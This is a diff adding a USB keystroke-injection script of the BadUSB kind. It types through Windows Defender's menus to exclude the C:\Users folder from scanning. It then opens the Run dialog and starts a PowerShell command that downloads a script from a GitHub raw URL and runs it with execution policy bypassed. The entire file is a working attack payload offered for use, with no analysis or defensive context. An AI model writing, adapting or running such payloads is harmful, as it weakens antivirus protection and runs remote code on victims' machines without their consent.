@@ -1,0 +1,22 @@
+KEY WIN
+pause 100
+STRING defender
+pause 100
+KEY ENTER
+pause 1000
+KEY TAB*5
+KEY ENTER
+KEY TAB*11
+KEY ENTER
+KEY ENTER 
+KEY DOWN
+KEY ENTER
+STRING C:\Users
+KEY ENTER
+KEY TAB
+KEY ENTER
+COMBO ALT+F4
+pause 500
+COMBO WIN+r
+STRING powershell.exe -NoProfile -Command \"$p = Join-Path $env:USERPROFILE 'exec2.ps1'; curl.exe 'https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/exec2.ps1' -o $p; powershell.exe -ExecutionPolicy Bypass -File $p; exit\"
+KEY ENTER
